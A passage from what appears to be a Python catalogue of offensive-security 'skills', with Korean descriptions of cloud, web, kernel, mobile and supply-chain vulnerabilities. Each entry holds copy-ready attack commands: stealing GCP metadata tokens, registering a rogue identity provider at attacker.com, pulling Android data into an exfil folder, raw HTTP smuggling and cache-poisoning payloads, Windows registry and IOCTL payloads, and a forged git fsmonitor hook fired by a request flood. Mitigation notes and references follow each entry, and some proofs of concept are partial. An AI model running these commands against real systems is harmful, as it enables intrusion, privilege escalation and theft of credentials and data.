        "  -H 'X-Forwarded-For: 10.0.0.1' \\"
        "  -H 'X-Real-IP: 127.0.0.1'",
    ],
    "notes": (
        "[완화] ALB에 CloudFront IP 범위만 허용하는 Security Group 설정. "
        "WAF를 ALB에 직접 연결(CloudFront 우회 불가). "
        "룰 우선순위 감사 및 정기 검토. "
        "[레퍼런스] "
        "blog.doyensec.com — CloudSecTidBits: ELBaph/ALB, "
        "AWS ALB Security Group Best Practices"
    ),
},

"sec-cloud-gcp-debug-rce": {
    "name": "GCP Internal Debug Endpoint RCE (StubZero)",
    "module": "SecSkills-Cloud",
    "tags": ["gcp", "google-cloud", "debug-endpoint", "rce", "protobuf",
             "internal-api", "workflow-execution", "cloud-rce"],
    "desc": (
        "GCP 내부 서비스의 디버그 엔드포인트 노출로 인한 RCE ($148,337 버그바운티). "
        "getProtoDefinition API가 내부 Protobuf 스키마 누출 → "
        "내부 Workflow 실행 큐 접근 가능 → "
        "임의 워크플로 파라미터로 RCE 달성. "
        "GCP 메타데이터 SSRF와 조합 시 확장 가능. "
        "CVE-2026-2031 (Google Cloud Production RCE)."
    ),
    "tools": ["curl", "python3", "grpcurl", "burpsuite"],
    "commands": [
        "# 1) GCP 디버그 엔드포인트 탐지",
        "curl -sk https://TARGET.appspot.com/_ah/admin",
        "curl -sk https://TARGET.appspot.com/debug",
        "curl -sk https://TARGET.run.app/_debug",
        "# 2) 내부 API 탐색",
        "curl -sk https://TARGET/api/v1/debug/protoDefinition",
        "curl -sk https://TARGET/internal/getProtoDefinition",
        "# 3) 노출된 Protobuf 스키마 분석",
        "curl -sk -m 10 'https://TARGET/internal/proto' | python3 -c \"import sys; print(sys.stdin.read()[:2000])\"",
        "# 4) 워크플로 실행 큐 접근",
        "curl -sk -X POST https://TARGET/internal/workflow/execute \\"
        "  -H 'Content-Type: application/json' \\"
        "  -d '{\"workflow\":\"test\",\"params\":{\"cmd\":\"id\"}'",
        "# 5) GCP 메타데이터 SSRF 조합",
        "curl -sk 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' \\"
        "  -H 'Metadata-Flavor: Google'",
    ],
    "notes": (
        "[완화] 디버그 엔드포인트를 프로덕션 환경에서 완전 비활성화. "
        "내부 API에 인증 미들웨어 필수 적용. "
        "Cloud Armor WAF로 내부 경로 차단. "
        "[레퍼런스] "
        "brutecat.com — StubZero: $148,337 RCE in Google Cloud Production, "
        "CVE-2026-2031"
    ),
},

"sec-cloud-aws-cognito-sso": {
    "name": "AWS Cognito Multi-IdP SSO Attack (Ghost Identity / Routing Hijack)",
    "module": "SecSkills-Cloud",
    "tags": ["aws", "cognito", "sso", "oauth", "saml", "identity-provider",
             "ghost-identity", "jwt", "account-takeover", "cloud-auth"],
    "desc": (
        "AWS Cognito User Pools에서 다중 IdP(소셜 로그인) 구성 시 발생하는 복합 공격. "
        "1) JIT Ghost Identity 인젝션: 악성 OIDC/SAML IdP로 Cognito에 없는 사용자 계정 즉시 생성. "
        "2) Trigger Source 값 혼동: Pre-Authentication Lambda의 triggerSource 필드 위조로 인증 로직 우회. "
        "3) Sub-splitting 공격: JWT sub 클레임 파서 차이로 계정 연동 오염. "
        "4) IdP 라우팅 하이재킹: 만료된 IdP 설정 재등록으로 다른 사용자 계정 탈취. "
        "도구: maSSO (악성 OIDC/SAML IdP 서버)."
    ),
    "tools": ["python3", "burpsuite", "aws-cli", "curl", "jwt-tool"],
    "commands": [
        "# 1) Cognito User Pool 정보 수집",
        "aws cognito-idp list-user-pools --max-results 60",
        "aws cognito-idp describe-user-pool --user-pool-id POOL_ID",
        "aws cognito-idp list-identity-providers --user-pool-id POOL_ID",
        "# 2) OIDC Discovery 엔드포인트 탐색",
        "curl -s https://cognito-idp.REGION.amazonaws.com/POOL_ID/.well-known/openid-configuration",
        "# 3) Ghost Identity 인젝션 테스트",
        "# maSSO 악성 IdP 서버 설정 후 Cognito에 연동",
        "# python3 masso.py --mode ghost-inject --pool POOL_ID --email victim@target.com",
        "# 4) Trigger Source 혼동 테스트",
        "# Lambda triggerSource: 'PreAuthentication_Authentication' vs 'TokenGeneration_HostedAuth'",
        "# 5) JWT sub 클레임 splitting 테스트",
        "python3 -c \""
        "import jwt, json; "
        "payload = {'sub': 'attacker@evil.com#victim@target.com', 'email': 'victim@target.com'}; "
        "print(jwt.encode(payload, 'secret', algorithm='HS256'))\"",
        "# 6) IdP 라우팅 하이재킹 — 만료 IdP 재등록",
        "aws cognito-idp create-identity-provider --user-pool-id POOL_ID \\"
        "  --provider-name ExpiredProvider --provider-type OIDC \\"
        "  --provider-details ProviderURL=https://attacker.com",
    ],
    "notes": (
        "[완화] Lambda Pre-Authentication Trigger에서 triggerSource 엄격 검증. "
        "IdP 이메일 검증 필수 활성화. "
        "만료 IdP 즉시 삭제. Cognito 고급 보안 기능(ASF) 활성화. "
        "[레퍼런스] "
        "blog.doyensec.com — The Danger of Multi-SSO in AWS Cognito User Pools, "
        "maSSO tool, AWS Cognito Security Best Practices"
    ),
},

"sec-supply-chain-npx-confusion": {
    "name": "npx Binary Name Confusion (Supply Chain)",
    "module": "SecSkills-Supply",
    "tags": ["supply-chain", "npx", "npm", "dependency-confusion",
             "binary-name", "package-confusion", "ai-agent", "ci-cd"],
    "desc": (
        "npm 패키지명과 바이너리명(bin 필드)이 다른 점을 악용한 공급망 공격. "
        "npx some-tool 실행 시 npm 레지스트리에서 'some-tool'이라는 패키지를 설치하지 않고 "
        "바이너리명이 'some-tool'인 다른 패키지를 설치. "
        "공격자는 인기 바이너리명과 같은 바이너리를 등록하여 "
        "다른 패키지명으로 배포 → 악성 스크립트 실행. "
        "AI 에이전트(Claude Code, Copilot 등)가 도구를 npx로 자동 실행할 때 특히 위험."
    ),
    "tools": ["npm", "python3", "curl", "node"],
    "commands": [
        "# 1) 타겟이 사용하는 npx 명령 목록 수집",
        "grep -r 'npx ' package.json .github/workflows/ scripts/ | grep -v node_modules",
        "# 2) 바이너리명으로 다른 패키지 검색",
        "npm search --json 'BINARY_NAME' | python3 -c \\"
        "\"import json,sys; pkgs=json.load(sys.stdin); "
        "[print(p['name'],p.get('description','')) for p in pkgs[:10]]\"",
        "# 3) 패키지명 vs 바이너리명 불일치 탐지",
        "python3 -c \""
        "import subprocess, json; "
        "result = subprocess.run(['npm', 'info', 'PACKAGE', '--json'], capture_output=True, text=True); "
        "data = json.loads(result.stdout); "
        "print('package:', data.get('name')); "
        "print('binaries:', list(data.get('bin', {}).keys()))\"",
        "# 4) 스코프 패키지 바이너리명 혼동 확인",
        "# @scope/package → binary name 'tool' → npx tool이 다른 패키지 설치",
        "npm info @legitimate/pkg bin",
        "npm info malicious-pkg bin",
        "# 5) 악성 패키지 등록 여부 확인 (레지스트리)",
        "curl -s 'https://registry.npmjs.org/BINARY_NAME' | python3 -c \\"
        "\"import json,sys; d=json.load(sys.stdin); print(d.get('name'), d.get('description',''))\"",
    ],
    "notes": (
        "[완화] npx 실행 시 정확한 패키지명 지정 (npx PACKAGE_NAME@version 형태). "
        "package-lock.json 또는 pnpm lock으로 결정론적 설치. "
        "AI 에이전트의 자동 npx 실행 비활성화. "
        "npm audit + socket.dev로 공급망 모니터링. "
        "[레퍼런스] "
        "landh.tech — npx Used Confusion and It's Super Effective, "
        "npm Security Advisory — Binary Name Confusion"
    ),
},

"sec-infra-exim-rce": {
    "name": "Exim MTA CVE-2026-45185 Dead Letter Deserialization RCE",
    "module": "SecSkills-Infra",
    "tags": ["exim", "mta", "rce", "deserialization", "mail-server",
             "cve-2026-45185", "dead-letter", "smtp", "critical"],
    "desc": (
        "Exim MTA의 dead letter 처리 과정에서 발생하는 역직렬화 RCE. "
        "CVE-2026-45185: Exim이 배달 실패 메시지(dead letter)를 재처리할 때 "
        "직렬화된 데이터를 검증 없이 역직렬화 → 임의 코드 실행. "
        "SMTP를 통해 특수 제작된 메일 발송만으로 RCE 달성 가능. "
        "Exim 4.96 이하 영향."
    ),
    "tools": ["curl", "python3", "nmap", "swaks", "smtp-client"],
    "commands": [
        "# 1) Exim 버전 확인",
        "nmap -sV -p 25 TARGET --script=banner",
        "nc TARGET 25",
        "# EHLO test → 220 TARGET.com ESMTP Exim 4.XX",
        "# 2) Exim 서비스 탐지",
        "curl -s --max-time 5 telnet://TARGET:25",
        "swaks --to test@TARGET --server TARGET --helo attacker.com",
        "# 3) CVE-2026-45185 취약 버전 확인 (4.96 이하)",
        "nmap -p 25 --script smtp-ntlm-info TARGET",
        "# 4) 특수 제작 dead letter 메일 발송",
        "python3 -c \""
        "import smtplib, email.mime.text; "
        "msg = email.mime.text.MIMEText(''); "
        "msg['Subject'] = 'CVE-2026-45185 test'; "
        "msg['From'] = 'test@attacker.com'; "
        "msg['To'] = 'postmaster@TARGET'; "
        "# 실제 익스플로잇은 직렬화 페이로드 삽입 필요"
        "print('SMTP test prepared')\"",
        "# 5) Nuclei 템플릿으로 자동 스캔",
        "nuclei -t cves/2026/CVE-2026-45185.yaml -target TARGET",
    ],
    "notes": (
        "[완화] Exim 4.97+ 패치 적용. "
        "SMTP 포트 접근 제어 (허용된 발신자만). "
        "dead letter 처리 비활성화 옵션 검토. "
        "[레퍼런스] "
        "xbow.com — Dead Letter: CVE-2026-45185 (Exim RCE), "
        "NVD CVE-2026-45185, Exim Security Advisories"
    ),
},

"sec-android-wireless-debug-rce": {
    "name": "Android CVE-2026-0073 Wireless Debugging RCE",
    "module": "SecSkills-Mobile",
    "tags": ["android", "adb", "wireless-debugging", "rce", "cve-2026-0073",
             "adjacent-network", "no-user-interaction", "critical"],
    "desc": (
        "Android ADB(Android Debug Bridge) 무선 디버깅 기능의 인증 우회 취약점. "
        "CVE-2026-0073: ADB TCP 무선 디버깅 활성화 시 "
        "같은 네트워크(LAN/Wi-Fi)의 공격자가 인증 없이 ADB shell 접근 가능. "
        "사용자 상호작용 불필요, CVSSv3 9.8 Critical. "
        "공격자는 shell 사용자 권한으로 명령 실행 → "
        "데이터 추출, 앱 설치, 추가 권한상승 가능."
    ),
    "tools": ["adb", "nmap", "python3", "scapy"],
    "commands": [
        "# 1) 무선 ADB 포트 탐지 (5555/5037/5554)",
        "nmap -sV -p 5554-5558 TARGET_NETWORK/24",
        "# 2) ADB 연결 시도 (인증 없이)",
        "adb connect TARGET_IP:5555",
        "adb devices",
        "# 3) 연결 성공 시 Shell 접근",
        "adb -s TARGET_IP:5555 shell id",
        "adb -s TARGET_IP:5555 shell getprop ro.product.model",
        "adb -s TARGET_IP:5555 shell cat /proc/version",
        "# 4) 데이터 추출",
        "adb -s TARGET_IP:5555 shell run-as com.target.app cat /data/data/com.target.app/shared_prefs/prefs.xml",
        "adb -s TARGET_IP:5555 pull /sdcard/Download/ ./exfil/",
        "# 5) 네트워크 스캔으로 취약 기기 대량 탐지",
        "python3 -c \""
        "import socket, ipaddress; "
        "[print(f'Found: {ip}') for ip in ipaddress.IPv4Network('192.168.1.0/24') "
        "if not socket.setdefaulttimeout(0.5) or "
        "(lambda s: s.connect_ex((str(ip), 5555)) == 0)(socket.socket())]\"",
    ],
    "notes": (
        "[완화] 무선 디버깅 비활성화 (개발자 옵션 → ADB 무선 디버깅 OFF). "
        "공개 Wi-Fi에서 디버깅 모드 사용 금지. "
        "Android 보안 패치 적용 (2026-05 이후). "
        "[레퍼런스] "
        "mobile-hacker.com — Android RCE via Wireless Debugging (CVE-2026-0073), "
        "Android Security Bulletin May 2026, NVD CVE-2026-0073"
    ),
},

"sec-kernel-af-alg-lpe": {
    "name": "Linux Kernel CVE-2026-31431 AF_ALG + splice() Page Cache LPE",
    "module": "SecSkills-Kernel",
    "tags": ["linux-kernel", "lpe", "privilege-escalation", "af-alg", "splice",
             "page-cache", "cve-2026-31431", "container-escape", "critical"],
    "desc": (
        "Linux 커널 AF_ALG(Crypto API 소켓) + splice() 시스템콜 조합으로 "
        "읽기 가능한 임의 파일의 페이지 캐시에 4바이트 쓰기 가능. "
        "CVE-2026-31431: authencesn AEAD 템플릿의 scratch 영역 쓰기 버그. "
        "영향: Ubuntu 22.04/24.04, Amazon Linux 2/2023, RHEL 8/9, SUSE 15. "
        "732바이트 Python PoC로 root LPE 달성. "
        "컨테이너 내부에서도 호스트 커널 공격 가능 (컨테이너 탈출 벡터)."
    ),
    "tools": ["python3", "gcc", "gdb", "checksec"],
    "commands": [
        "# 1) 취약 커널 버전 확인",
        "uname -r",
        "# 취약: Linux < 6.X.Y (패치 버전 확인 필요)",
        "# 2) AF_ALG 소켓 지원 확인",
        "python3 -c \""
        "import socket; "
        "s = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0); "
        "print('AF_ALG 지원됨 — LPE 가능성 있음')\"",
        "# 3) CVE-2026-31431 취약성 탐지",
        "cat /proc/crypto | grep -A5 authencesn",
        "# 4) Nuclei/PoC 확인",
        "nuclei -t cves/2026/CVE-2026-31431.yaml -target localhost",
        "# 5) splice() + AF_ALG 조합 PoC 구조",
        "python3 -c \""
        "import socket, os; "
        "# AF_ALG AEAD 소켓 생성",
        "alg = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0); "
        "alg.bind(('aead', 'authencesn(hmac(sha1),cbc(aes))', 0, 16, 20)); "
        "print('Step 1: AF_ALG AEAD socket created'); "
        "# splice()로 페이지 캐시 쓰기 → root 권한 파일 수정\"",
        "# 6) 컨테이너 탈출 체크",
        "cat /proc/1/cgroup | head -3",
        "ls /.dockerenv 2>/dev/null && echo 'Container detected'",
    ],
    "notes": (
        "[완화] 최신 커널 패치 적용. "
        "seccomp 프로파일로 AF_ALG 소켓 생성 차단. "
        "컨테이너: CAP_NET_ADMIN, CAP_SYS_ADMIN 제거. "
        "[레퍼런스] "
        "xint.io — Copy Fail: 732 Bytes to Root on Linux (CVE-2026-31431), "
        "NVD CVE-2026-31431, Linux Kernel Mailing List"
    ),
},


# ── v3.2.68 신규 스킬 ─────────────────────────────────────────────────────────

"sec-cpp-libc-gotcha": {
    "name": "C/C++ Linux libc 함정 & seccomp/BPF 샌드박스 우회",
    "module": "SecSkills-Binary",
    "tags": ["c", "cpp", "libc", "inet-ntoa", "format-string", "seccomp", "bpf",
             "io-uring", "clone-untraced", "sandbox-bypass", "binary-review"],
    "desc": (
        "Trail of Bits Testing Handbook C/C++ 챕터 기반. "
        "Linux libc 주요 함정: inet_ntoa() 정적 버퍼 레이스 (snprintf와 동일 버퍼 재사용), "
        "format string 취약점, getenv() 경쟁 조건, putenv() 메모리 수명 문제. "
        "seccomp/BPF 샌드박스 우회: io_uring 시스템콜이 BPF 필터를 거치지 않고 실행 "
        "(IORING_OP_* 미필터링), CLONE_UNTRACED 플래그로 ptrace 기반 샌드박스 무력화. "
        "컴파일러 최적화로 인한 버그: 메모리 안전성 검사 제거, UB(미정의 동작) 악용."
    ),
    "tools": ["gcc", "clang", "gdb", "strace", "seccomp-tools", "python3"],
    "commands": [
        "# 1) inet_ntoa 레이스 조건 탐지 (정적 버퍼 재사용)",
        "grep -rn 'inet_ntoa' . --include='*.c' --include='*.cpp'",
        "# inet_ntoa 결과를 즉시 복사하지 않으면 다음 호출에서 덮어씀",
        "# 2) Format string 취약점 탐지",
        "grep -rn 'printf(.*%s' . --include='*.c' | grep -v '\"'",
        "# snprintf/printf 첫 인자가 사용자 입력이면 취약",
        "# 3) seccomp BPF 필터 분석",
        "seccomp-tools dump ./target_binary 2>/dev/null | head -50",
        "# io_uring 관련 syscall 번호 확인 (x86_64: 425~)",
        "python3 -c \"print([f'SYS_io_uring_{n}={425+i}' for i,n in enumerate(['setup','enter','register'])])\"",
        "# 4) io_uring BPF 우회 탐지",
        "python3 -c \""
        "import subprocess; "
        "result = subprocess.run(['seccomp-tools','dump','./binary'], capture_output=True, text=True); "
        "lines = result.stdout; "
        "print('VULNERABLE: io_uring not filtered' if '425' not in lines and '426' not in lines else 'io_uring filtered')\"",
        "# 5) CLONE_UNTRACED 우회 탐지",
        "grep -rn 'CLONE_UNTRACED\\|CLONE_NEWUSER' . --include='*.c'",
        "# 6) 컴파일러 최적화 UB 감지 (AddressSanitizer)",
        "gcc -fsanitize=address,undefined -O0 -g target.c -o target_asan && ./target_asan",
        "# 7) 전체 바이너리 보호 확인",
        "checksec --file=./target_binary",
    ],
    "notes": (
        "[완화] inet_ntoa 대신 inet_ntop 사용(스레드 안전). "
        "seccomp 필터에 io_uring 관련 syscall(425-427) 명시적 차단. "
        "CLONE_UNTRACED 플래그 사용 금지 정책 적용. "
        "-fstack-protector-strong, -D_FORTIFY_SOURCE=2 컴파일 옵션 적용. "
        "[레퍼런스] "
        "Trail of Bits Testing Handbook — C/C++ Security Checklist (2026), "
        "Linux man page: seccomp(2), io_uring(7), clone(2)"
    ),
},

"sec-windows-driver-registry-tycon": {
    "name": "Windows WDF 드라이버 RTL_QUERY_REGISTRY_TABLE 타입 혼동 → 커널 코드 실행",
    "module": "SecSkills-Binary",
    "tags": ["windows", "kernel", "wdf", "driver", "registry", "type-confusion",
             "rtl-query-registry", "kernel-rce", "dos", "windbg"],
    "desc": (
        "WDF(Windows Driver Framework) 드라이버에서 "
        "RTL_QUERY_REGISTRY_TABLE + RTL_QUERY_REGISTRY_DIRECT 플래그 조합 취약점. "
        "공격자가 레지스트리 값 타입을 REG_BINARY/REG_SZ 대신 REG_MULTI_SZ 등으로 설정 시 "
        "EntryContext 포인터가 함수 포인터로 해석되어 커널 코드 실행 가능. "
        "QueryRoutine=NULL + DIRECT 플래그 조합은 값 크기/타입 검증 없이 직접 쓰기. "
        "쉬운 DoS: 올바르지 않은 타입의 큰 값 설정 → 커널 버퍼 오버플로우."
    ),
    "tools": ["windbg", "regedit", "python3", "ctypes", "pe-studio"],
    "commands": [
        "# 1) 드라이버 내 RTL_QUERY_REGISTRY_TABLE 사용 탐지",
        "strings target.sys | grep -i 'registry\\|RegQueryValue'",
        "# IDA/Ghidra에서 RtlQueryRegistryValues 호출 확인",
        "# 2) IOCTL 입력 레지스트리 경로 제어 가능 여부 확인",
        "# WdfRequestRetrieveInputBuffer로 받은 regPath가 공격자 제어 가능한지 분석",
        "# 3) Python으로 레지스트리 타입 조작 (Windows 환경)",
        "python3 -c \""
        "import winreg; "
        "key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\\AttackerKey'); "
        "# REG_BINARY 대신 REG_MULTI_SZ 타입으로 MajorVersion 값 설정 (타입 혼동)"
        "winreg.SetValueEx(key, 'MajorVersion', 0, winreg.REG_MULTI_SZ, ['\\x00' * 256]); "
        "print('Registry type confusion payload written')\"",
        "# 4) DoS 페이로드 — 큰 값으로 커널 버퍼 오버플로우 유도",
        "python3 -c \""
        "import winreg; "
        "key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\\AttackerKey'); "
        "winreg.SetValueEx(key, 'MajorVersion', 0, winreg.REG_BINARY, b'A' * 0x1000); "
        "print('DoS payload: oversized REG_BINARY value set')\"",
        "# 5) IOCTL 전송 (드라이버 통신)",
        "python3 -c \""
        "import ctypes, struct; "
        "kernel32 = ctypes.windll.kernel32; "
        "hDevice = kernel32.CreateFileW(r'\\\\\\\\.\\\\TargetDriver', 0xC0000000, 0, None, 3, 0, None); "
        "regPath = r'\\Registry\\Machine\\SOFTWARE\\AttackerKey\\0'; "
        "payload = regPath.encode('utf-16-le') + b'\\x00\\x00'; "
        "kernel32.DeviceIoControl(hDevice, 0x222004, payload, len(payload), None, 0, None, None); "
        "print('IOCTL sent with attacker registry path')\"",
        "# 6) WinDbg로 드라이버 분석",
        "# !drvobj TargetDriver 7",
        "# bp nt!RtlQueryRegistryValues",
    ],
    "notes": (
        "[완화] RTL_QUERY_REGISTRY_DIRECT 대신 QueryRoutine 콜백 사용. "
        "레지스트리 값 타입(Type 필드) 명시적 검증. "
        "공격자 제어 레지스트리 경로 허용 금지. "
        "Driver Verifier 활성화로 풀 손상 조기 탐지. "
        "[레퍼런스] "
        "Trail of Bits Testing Handbook — Windows Kernel Driver Security (2026), "
        "Microsoft Docs: RTL_QUERY_REGISTRY_TABLE, "
        "NtQueryKey / ZwQueryValueKey 안전 대안"
    ),
},

"sec-web-oauth-dcr-ssrf-chain": {
    "name": "OAuth DCR + Open Redirect + Path Normalization → Full-Read SSRF 체인",
    "module": "SecSkills-Web",
    "tags": ["oauth", "dcr", "dynamic-client-registration", "ssrf", "open-redirect",
             "path-normalization", "full-read-ssrf", "redirect-uri", "chain"],
    "desc": (
        "OAuth 2.0 Dynamic Client Registration(DCR, RFC 7591)의 redirect_uri 미검증 + "
        "Open URL Redirect + URL 경로 정규화 불일치를 3단 체이닝해 Full-Read SSRF 달성. "
        "공격 흐름: 1) DCR으로 임의 redirect_uri 등록 "
        "(예: https://attacker.com/callback#@internal-host/) "
        "2) 인가 서버의 Open Redirect 취약점으로 SSRF 방어 우회 "
        "3) 서버/프록시 간 경로 정규화 차이(../·encoded slash)로 내부 경로 접근 "
        "4) 인가 코드 또는 토큰이 SSRF 응답에 포함되어 완전 읽기. "
        "내부 메타데이터 서버(AWS 169.254.169.254), 내부 API 완전 읽기 가능."
    ),
    "tools": ["burpsuite", "ffuf", "curl", "python3", "interactsh"],
    "commands": [
        "# 1) DCR 엔드포인트 탐지",
        "curl -s https://TARGET/.well-known/oauth-authorization-server | python3 -m json.tool | grep registration",
        "curl -s https://TARGET/.well-known/openid-configuration | grep registration_endpoint",
        "# 2) 임의 redirect_uri로 클라이언트 등록 시도",
        "curl -s -X POST https://TARGET/oauth/register "
        "-H 'Content-Type: application/json' "
        "-d '{\"redirect_uris\":[\"https://evil.com\"],\"client_name\":\"test\"}'",
        "# 3) SSRF 페이로드를 redirect_uri에 삽입",
        "curl -s -X POST https://TARGET/oauth/register "
        "-H 'Content-Type: application/json' "
        "-d '{\"redirect_uris\":[\"https://169.254.169.254/latest/meta-data/\"],\"client_name\":\"ssrf\"}'",
        "# 4) Open Redirect 탐지 및 SSRF 우회 체인",
        "# redirect_uri에 Open Redirect 엔드포인트 삽입",
        "REDIRECT_URI='https://TARGET/oauth/authorize?redirect_uri=https://169.254.169.254/'",
        "python3 -c \""
        "import urllib.parse; "
        "payload = {'redirect_uris': [urllib.parse.quote('https://TARGET/redirect?url=http://169.254.169.254/')]}; "
        "print(payload)\"",
        "# 5) 경로 정규화 우회",
        "# ../·%2F·%252F·\\·//로 경로 정규화 차이 악용",
        "python3 -c \""
        "bypasses = ["
        "    'https://TARGET/callback/../internal/',"
        "    'https://TARGET/callback/%2F..%2Finternal/',"
        "    'https://TARGET/callback\\/internal/',"
        "    'https://TARGET@169.254.169.254/callback',"
        "];"
        "[print(b) for b in bypasses]\"",
        "# 6) Full-Read SSRF 확인 (Interactsh)",
        "# interactsh-client -server https://app.interactsh.com",
        "# redirect_uri에 OOB 콜백 URL 삽입 후 토큰 수신 확인",
        "curl -s 'https://TARGET/oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://OOB.interactsh.com&response_type=code'",
    ],
    "notes": (
        "[완화] DCR에서 redirect_uri 화이트리스트 검증. "
        "Open Redirect 완전 제거 또는 검증된 도메인만 허용. "
        "SSRF 방어: 내부 IP 범위 차단, DNS Rebinding 방지. "
        "URL 정규화는 백엔드에서 일관되게 처리. "
        "[레퍼런스] "
        "eib.hashnode.dev — Crafting a Full-Read SSRF via OAuth DCR + Open URL Redirects + Path Normalization, "
        "RFC 7591 — OAuth 2.0 Dynamic Client Registration Protocol, "
        "PortSwigger — SSRF via Open Redirection"
    ),
},

"sec-web-smuggling-upgrade-bypass": {
    "name": "HTTP Upgrade 헤더 미검증 패스스루 + TE 파싱 오류 → Request Smuggling + Cache Poisoning",
    "module": "SecSkills-Web",
    "tags": ["http-smuggling", "request-smuggling", "upgrade-header", "transfer-encoding",
             "cache-poisoning", "pingora", "reverse-proxy", "cve-2026-2833", "rust"],
    "desc": (
        "Cloudflare Pingora 등 Rust 기반 리버스 프록시에서 발견된 HTTP Request Smuggling 취약점. "
        "Bug 1 (CVE-2026-2833): Upgrade 헤더 수신 즉시 101 응답 대기 없이 TCP 바이트 패스스루 전환 "
        "→ 다음 HTTP 요청이 프록시 레이어를 우회해 백엔드로 직접 전달 (ACL/WAF/인증 우회). "
        "Bug 2: Transfer-Encoding: chunked 헤더 말형성 처리 오류 → CL.TE/TE.CL 스머글링. "
        "Bug 3: Cache Poisoning — 스머글된 요청으로 캐시에 악의적 응답 저장 → 다른 사용자 영향. "
        "Pingora 0.8.0 이전 버전, Pingap, Encore 등 Pingora 기반 파생 프로젝트 포함."
    ),
    "tools": ["burpsuite", "curl", "python3", "smuggler.py", "http-request-smuggler"],
    "commands": [
        "# 1) Upgrade 헤더 패스스루 취약점 탐지 (CVE-2026-2833)",
        "python3 -c \""
        "import socket; "
        "s = socket.create_connection(('TARGET', 80)); "
        "payload = ("
        "    b'GET / HTTP/1.1\\r\\n'"
        "    b'Host: TARGET\\r\\n'"
        "    b'Upgrade: xxx\\r\\n'"
        "    b'Connection: Upgrade\\r\\n'"
        "    b'\\r\\n'"
        "    b'GET /admin HTTP/1.1\\r\\n'"
        "    b'Host: TARGET\\r\\n'"
        "    b'\\r\\n'"
        "); "
        "s.send(payload); "
        "resp = s.recv(4096); "
        "print('VULNERABLE' if b'admin' in resp.lower() or b'401' not in resp else 'OK')\"",
        "# 2) TE.CL 스머글링 탐지",
        "python3 -c \""
        "import socket; "
        "s = socket.create_connection(('TARGET', 80)); "
        "payload = ("
        "    b'POST / HTTP/1.1\\r\\n'"
        "    b'Host: TARGET\\r\\n'"
        "    b'Transfer-Encoding: chunked\\r\\n'"
        "    b'Content-Length: 4\\r\\n'"
        "    b'\\r\\n'"
        "    b'5c\\r\\n'"
        "    b'GPOST / HTTP/1.1\\r\\nHost: TARGET\\r\\nContent-Length: 15\\r\\n\\r\\n'"
        "    b'0\\r\\n'"
        "    b'\\r\\n'"
        "); "
        "s.send(payload); "
        "print(s.recv(4096).decode(errors='ignore'))\"",
        "# 3) Cache Poisoning 체인",
        "# 스머글된 요청으로 GET /로 캐시 오염",
        "# Step1: 스머글로 악의적 응답 캐시에 저장 (bash+curl)",
        "STATUS=$(curl -sk -m 10 -o /dev/null -w '%{http_code}' 'https://TARGET/' "
        "-H 'Transfer-Encoding: chunked' -H 'X-Forwarded-Host: evil.com'); "
        "echo \"Cache poisoning attempted: ${STATUS}\"",
        "# 4) Pingora 버전 탐지",
        "curl -sI https://TARGET/ | grep -i 'server\\|x-powered\\|via'",
        "# 5) 자동화 도구",
        "python3 smuggler.py -u https://TARGET/ -l 5 2>/dev/null | tail -20",
    ],
    "notes": (
        "[완화] Pingora → 0.8.0 이상 업그레이드. "
        "Upgrade 헤더 처리 시 101 Switching Protocols 응답 수신 후 패스스루 전환. "
        "TE 헤더 엄격한 파싱(말형성 chunked 인코딩 거부). "
        "Cache 키에 요청 바디 포함. "
        "[레퍼런스] "
        "xclow3n.com — Breaking Pingora: HTTP Request Smuggling & Cache Poisoning (CVE-2026-2833), "
        "Cloudflare Blog — Pingora 0.8.0 Security Fix, "
        "PortSwigger — HTTP Request Smuggling"
    ),
},

"sec-cloud-git-toctou-fsmonitor-rce": {
    "name": "Git 디렉터리 삭제 TOCTOU + fsmonitor Hook → RCE + K8s 권한상승",
    "module": "SecSkills-Cloud",
    "tags": ["git", "toctou", "race-condition", "fsmonitor", "rce", "looker",
             "google-cloud", "kubernetes", "service-account", "path-traversal"],
    "desc": (
        "Google Cloud Looker의 Git 통합 기능에서 발견된 디렉터리 삭제 TOCTOU 레이스 → RCE. "
        "공격 흐름: 1) dir_path_array=[\"/\"]로 validate_dir_name() 우회 (.git 검증 로직 우회) "
        "2) FileUtils.rm_rf의 postorder 삭제 중 .git이 먼저 삭제되는 타이밍 윈도우 이용 "
        "3) worktree에 미리 배치한 forged config (fsmonitor 훅 포함) 활성화 "
        "4) 병렬 git status 요청으로 fsmonitor 훅 트리거 → 임의 명령 실행 "
        "5) Kubernetes 서비스 계정 secrets update 권한 악용 → 동일 클러스터 타 인스턴스 접근. "
        "Git 프로젝트 관리 기능이 있는 자체 호스팅 BI/웹 애플리케이션 전반에 적용 가능."
    ),
    "tools": ["burpsuite", "curl", "python3", "kubectl", "git"],
    "commands": [
        "# 1) Looker Git 삭제 API 취약점 탐지 (bash+curl)",
        "# dir_path_array=[\"/\"]로 루트 삭제 시도",
        "curl -sk -m 10 '${TARGET}/api/4.0/projects' "
        "-H 'Authorization: token ${TOKEN}' "
        "| python3 -c \"import json,sys; p=json.loads(sys.stdin.read()); print('Projects:', [x['id'] for x in p[:3]])\"",
        "# 2) fsmonitor 훅 forged config 준비",
        "printf '[core]\\nbare = false\\nworktree = \".\"\\nfsmonitor = \"id > /tmp/pwned.txt\"\\n' > /tmp/forged.git",
        "echo '[+] Forged git config:'; cat /tmp/forged.git",
        "# 3) TOCTOU 레이스 조건 공격 (bash+xargs)",
        "printf '%s\\n' $(seq 100) | xargs -P20 -I{} curl -sk -m 5 -X POST "
        "'${TARGET}/api/internal/projects/${PROJECT_ID}/git_status' "
        "-H 'Authorization: token ${TOKEN}' -o /dev/null -w '%{http_code}\\n' &",
        "curl -sk -m 10 -X POST '${TARGET}/api/internal/projects/${PROJECT_ID}/delete_dir' "
        "-H 'Authorization: token ${TOKEN}' -H 'Content-Type: application/json' "
        "-d '{\"dir_path_array\":[\"/\"]}' | python3 -c \"import json,sys; print(json.loads(sys.stdin.read()))\"",
        "wait; echo 'Race condition attack complete'",
        "# 4) K8s 서비스 계정 권한 확인 (RCE 후)",
        "# kubectl auth can-i update secrets -n looker",
        "# curl -sk https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/looker/secrets \\",
